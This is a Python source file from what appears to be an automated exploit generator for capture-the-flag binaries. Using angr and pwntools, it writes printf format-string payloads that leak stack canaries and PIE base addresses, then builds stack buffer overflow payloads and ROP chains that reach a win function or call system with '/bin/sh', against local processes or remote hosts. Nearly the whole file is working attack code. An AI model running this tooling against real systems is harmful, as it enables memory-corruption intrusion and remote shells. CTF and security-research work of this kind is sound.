import angr
import os.path
import subprocess
from dataclasses import dataclass
from goals import Goal, SystemFunction, WinFunction
from pwnlib.util.packing import p64
from pwnlib.tubes.process import process
from pwnlib.tubes.remote import remote
from pwnlib.rop.rop import ROP
from vulns import (
    Vulnerability,
    StackBufferOverflow,
    WinFunctionCall,
    UnconstrainedPrintf,
    BufferWrite,
    ShString,
)
from binary import Binary
from typing import Optional
from constants import PROCESS_STDOUT_WAIT_TIMEOUT


@dataclass
class ExploitError(Exception):
    message: str


@dataclass
class Section:
    start: int
    end: int
    file: Optional[str]


@dataclass
class Remote:
    host: str
    port: int


@dataclass
class Leak:
    canary: int
    executable_base_address: int

    def __repr__(self) -> str:
        return f"""canary = 0x{self.canary:x}
executable base address = 0x{self.executable_base_address:x}"""


@dataclass
class PrintfLeakPayload:
    payload: bytes
    leaks_canary: bool
    leaks_pie: bool
    pie_leak_offset: int

    def extract_leak(self, leak: bytes) -> Leak:
        leak_parts = leak.split(b"0x", maxsplit=1)[-1].split(b"\n")[0].split(b".")
        i = 0
        canary = None
        executable_base_address = None
        if self.leaks_canary:
            canary = int(leak_parts[i], 16)
            i += 1
        if self.leaks_pie:
            pie_leak = int(leak_parts[i], 16)
            executable_base_address = pie_leak - self.pie_leak_offset
        return Leak(canary, executable_base_address)


class ExploitProgress:
    def __init__(self, verbose: bool):
        self.verbose = verbose

    def starting_goal(self, goal: Goal):
        if self.verbose:
            print(f"Starting goal {goal}")

    def achieved_goal(self, goal: Goal):
        if self.verbose:
            print(f"Achieved goal {goal}")

    def starting_vuln(self, vuln: Vulnerability):
        if self.verbose:
            print(f"Using primitive {vuln}")

    def giving_up_on_vuln(self, vuln: Vulnerability):
        if self.verbose:
            print(f"Gave up on using primitive {vuln}")

    def print(self, message: str):
        print(message)


def exploit(
    binary: Binary, goals: list[Goal], vulns: list[Vulnerability], remote_server: Optional[Remote], progress: ExploitProgress
) -> Optional[bytes]:
    leak_payload: Optional[PrintfLeakPayload] = None
    if binary.canary or binary.pie:
        leak_payload = gen_leak_payload(binary, vulns, progress)

    for goal in goals:
        progress.print(f"Current goal: {goal}")
        progress.starting_goal(goal)
        try:
            if remote_server is not None:
                p = remote(remote_server.host, remote_server.port)
            else:
                p = process(os.path.abspath(binary.path), cwd=os.path.dirname(binary.path))

            # Leaks required values from memory
            leak = None
            if leak_payload is not None:
                p.send(leak_payload.payload)

                # recvall with a timeout but it doesn't force close the connection
                with p.local(PROCESS_STDOUT_WAIT_TIMEOUT):
                    try:
                        while True:
                            if not p._fillbuffer():
                                break
                    except EOFError:
                        pass
                out = p.buffer.get()

                # Extract leaks.
                leak = leak_payload.extract_leak(out)
                progress.print(leak)

            # Compute final payload stage
            payload, style = gen_payload(binary, goal, vulns, leak, progress)
            p.sendline(payload)

            if style == "print_flag":
                out = p.recvall()
                p.close()

                if b"flag" in out:
                    progress.achieved_goal(goal)
                    return out
                else:
                    progress.print(f"Program outputted: {out}")
                    exit_code = p.poll()
                    progress.print(f"Exit code: {exit_code}")
            elif style == "shell":
                progress.achieved_goal(goal)
                p.interactive()
                p.close()
                return None
            else:
                progress.achieved_goal(goal)
                progress.print(f"Unknown exploit style '{style}'")
                p.interactive()
                p.close()
            progress.print("Exploit didn't print flag. Trying next goal.\n")
        except ExploitError as e:
            raise ExploitError(f"Failed to achieve goal: {e}")

    raise ExploitError("No solvable goals")


def gen_leak_payload(
    binary: Binary, vulns: list[Vulnerability], progress: ExploitProgress
) -> PrintfLeakPayload:
    for vuln in vulns:
        if not isinstance(vuln, UnconstrainedPrintf):
            continue
        progress.starting_vuln(vuln)
        return gen_printf_payload(binary, vuln)

    raise ExploitError("No viable leak primitive found")


def gen_printf_payload(binary: Binary, vuln: UnconstrainedPrintf) -> PrintfLeakPayload:
    state = vuln.state.copy()
    stack_size = state.solver.eval(state.regs.rbp - state.regs.rsp)
    base_index = stack_size // 8
    canary_index = base_index + 5
    pie_leak_index = base_index + 7
    format_string = b""
    if binary.canary:
        format_string += f"%{canary_index}$p.".encode()
    if binary.pie:
        format_string += f"%{pie_leak_index}$p.".encode()
    format_string += b"\x00"

    rdi = state.regs.rdi
    constraint = format_string == state.memory.load(rdi, len(format_string))
    if not state.solver.satisfiable(extra_constraints=[constraint]):
        raise ExploitError(f"Failed to constrain printf input to {format_string}")
    state.solver.add(constraint)
    payload = get_satisfying_input(state)

    proc_map_start_delim = "--START PROC MAPPING--"
    proc_map_end_delim = "--END PROC MAPPING--"
    stack_dump_end_delim = "--END STACK DUMP--"
    script = f"""b *(0x0000555555554000 + {vuln.addr})
commands 1
    printf "{proc_map_start_delim}\\n"
    info proc mappings
    printf "{proc_map_end_delim}\\n"
    x/40gx $rsp
    printf "{stack_dump_end_delim}\\n"
    exit
end

run"""

    script_file = "script.gdb"
    with open(script_file, "w") as f:
        f.write(script)

    p = subprocess.Popen(
        ["gdb", "--batch", f"--command={script_file}", "--args", binary.path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    stdout, _ = p.communicate(payload)

    stdout = stdout.decode()
    parts = (
        stdout.split(proc_map_start_delim + "\n")[1]
        .split(stack_dump_end_delim)[0]
        .split(proc_map_end_delim + "\n")
    )
    proc_map = parts[0].splitlines()[4:]
    stack_dump = parts[1].splitlines()

    sections = []
    for line in proc_map:
        parts = line.split(" ", maxsplit=3)
        start = int(parts[0], 16)
        end = int(parts[1], 16)
        file_parts = (
            parts[3].strip().split(" ", maxsplit=1)[1].strip().split(" ", maxsplit=1)
        )
        if len(file_parts) > 1:
            file = file_parts[1].strip()
        else:
            file = None
        sections.append(Section(start, end, file))

    values = []
    for line in stack_dump:
        parts = line.split(":\t", maxsplit=1)[1].split("\t")
        values += [int(part, 16) for part in parts]

    pie_leak_offset = None
    pie_leak_addr_offset = None
    for i, value in enumerate(values):
        file = None
        for section in sections:
            if value >= section.start and value < section.end:
                file = section.file
                break
        if file == os.path.abspath(binary.path):
            pie_leak_offset = i
            pie_leak_addr_offset = value - sections[0].start
            break

    if pie_leak_offset is None:
        raise ExploitError("Failed to find correct leak offset for defeating PIE")

    format_string = b""
    if binary.canary:
        format_string += f"%{canary_index}$p.".encode()
    if binary.pie:
        format_string += f"%{6 + pie_leak_offset}$p.".encode()
    format_string += b"\x00"

    state = vuln.state.copy()

    rdi = state.regs.rdi
    constraint = format_string == state.memory.load(rdi, len(format_string))
    if not state.solver.satisfiable(extra_constraints=[constraint]):
        raise ExploitError(f"Failed to constrain printf input to {format_string}")
    state.solver.add(constraint)
    payload = get_satisfying_input(state)

    return PrintfLeakPayload(payload, binary.canary, binary.pie, pie_leak_addr_offset)


def gen_payload(
    binary: Binary, goal: Goal, vulns: list[Vulnerability], leak: Optional[Leak], progress: ExploitProgress
) -> tuple[bytes, str]:
    if isinstance(goal, WinFunction):
        return (gen_win_function_payload(binary, goal, vulns, leak, progress), "print_flag")
    if isinstance(goal, SystemFunction):
        return (gen_system_function_payload(binary, goal, vulns, progress), "shell")

    raise ExploitError(f"Cannot generate payload for {goal}")


def gen_win_function_payload(
    binary: Binary, goal: WinFunction, vulns: list[Vulnerability], leak: Optional[Leak], progress: ExploitProgress
) -> bytes:
    for vuln in vulns:
        if isinstance(vuln, StackBufferOverflow):
            progress.starting_vuln(vuln)
            return gen_stack_buffer_overflow_payload(binary, vuln, goal, leak, progress)
        elif isinstance(vuln, WinFunctionCall):
            progress.starting_vuln(vuln)
            return get_satisfying_input(vuln.state)

    raise ExploitError(
        "Payload generation requires a StackBufferOverflow or WinFunctionCall vulnerability"
    )


# Assumes that the binary's base address is 0 cause that's what we do.
def rebase(addr: int, leak: Optional[Leak]):
    if leak is None:
        return addr
    else:
        return addr + leak.executable_base_address


def gen_stack_buffer_overflow_payload(
    binary: Binary, vuln: StackBufferOverflow, goal: WinFunction, leak: Optional[Leak], progress: ExploitProgress
) -> bytes:
    if binary.pie:
        binary.elf.address = leak.executable_base_address
    rop = ROP(binary.elf)
    gadget = rop.find_gadget(["ret"])
    input = vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )
    binary.elf.address
    payload = input
    progress.print(f"goal = 0x{rebase(goal.addr, leak):x}")
    if binary.canary:
        payload += (
            b"A" * (vuln.saved_rip_offset - 16)
            + p64(leak.canary)
            + b"B" * 8
            + p64(gadget.address)
            + p64(rebase(goal.addr, leak))
        )
    else:
        payload += b"A" * vuln.saved_rip_offset + p64(gadget.address) + p64(goal.addr)
    if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
        raise ExploitError("Payload exceeds vulnerability max write size")
    return payload


def get_satisfying_input(state: angr.SimState) -> bytes:
    # Angr leaves off newlines for some reason (I think...)
    return (
        state.solver.eval(
            state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
        )
        + b"\n"
    )


def gen_win_function_call_payload(
    binary: Binary, vuln: WinFunctionCall, goal: Goal
) -> bytes:
    return vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )


def gen_system_function_payload(
    binary: Binary, goal: SystemFunction, vulns: list[Vulnerability], progress: ExploitProgress
) -> bytes:
    reach_input, buf_addr, state = get_shell_string_payload(binary, vulns, progress)

    for vuln in vulns:
        if not isinstance(vuln, StackBufferOverflow):
            continue

        progress.starting_vuln(vuln)
        simgr = binary.angr.factory.simulation_manager(state.copy())
        simgr.explore(find=vuln.addr)

        if len(simgr.found) == 0:
            progress.giving_up_on_vuln(vuln)
            continue
        state2 = simgr.found[0]
        reach_input2: bytes = state2.solver.eval(
            state2.posix.stdin.load(state.posix.stdin.size, state2.posix.stdin.size - state.posix.stdin.size), cast_to=bytes
        )

        # hack
        # we need to figure out how to ignore input that we already decided on in the shell string payload
        # since it looks like this exploration is making its own
        # perhaps symbolic payloads will solve this all
        if len(reach_input) > 0:
            reach_input2 = b''

        rop = ROP(binary.elf)

        ret = rop.find_gadget(["ret"]).address
        rop.raw(ret)

        rop.call(goal.addr, [buf_addr])

        return reach_input + reach_input2 + b"A" * vuln.saved_rip_offset + rop.chain()


def get_shell_string_payload(
    binary: Binary, vulns: list[Vulnerability], progress: ExploitProgress
) -> tuple[bytes, int, angr.SimState]:
    """
    Determine an input that writes "/bin/sh" or similar to some address.

    # Returns
    a tuple of the input given to have the string written, the address of the string, and a poststate
    """

    options = angr.options.unicorn
    options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
    base_state = binary.angr.factory.full_init_state(
        add_options=options, stdin=angr.SimFile
    )

    shell_string: ShString | None = next(
        (vuln for vuln in vulns if isinstance(vuln, ShString)), None
    )
    if shell_string is not None:
        progress.starting_vuln(shell_string)
        return b"", shell_string.addr, base_state

    buffer_write: BufferWrite | None = next(
        (
            vuln
            for vuln in vulns
            if isinstance(vuln, BufferWrite) and vuln.buffer_type == "Global"
        ),
        None,
    )
    if buffer_write is None:
        raise ExploitError("No global buffer to write to")
    if buffer_write.buffer_len is not None and buffer_write.buffer_len < 8:
        raise ExploitError("Buffer too small")

    progress.starting_vuln(buffer_write)
    simgr = binary.angr.factory.simulation_manager(base_state)
    simgr.explore(find=buffer_write.instruction_addr)

    write_bin_sh_state = simgr.found[0]
    for vuln in vulns:
        if not isinstance(vuln, StackBufferOverflow):
            continue

        progress.starting_vuln(vuln)
        simgr = binary.angr.factory.simulation_manager(write_bin_sh_state.copy())
        simgr.explore(find=buffer_write.instruction_addr)

        if len(simgr.found) > 0:
            state = simgr.found[0]
            input = state.solver.eval(
                state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
            )
            if len(input) > 0:
                input += b"\n"
            input += b"/bin/sh\n"
            return input, buffer_write.buffer_addr, state
        else:
            progress.giving_up_on_vuln(vuln)

    raise ExploitError('No way to get "/bin/sh" in a buffer')
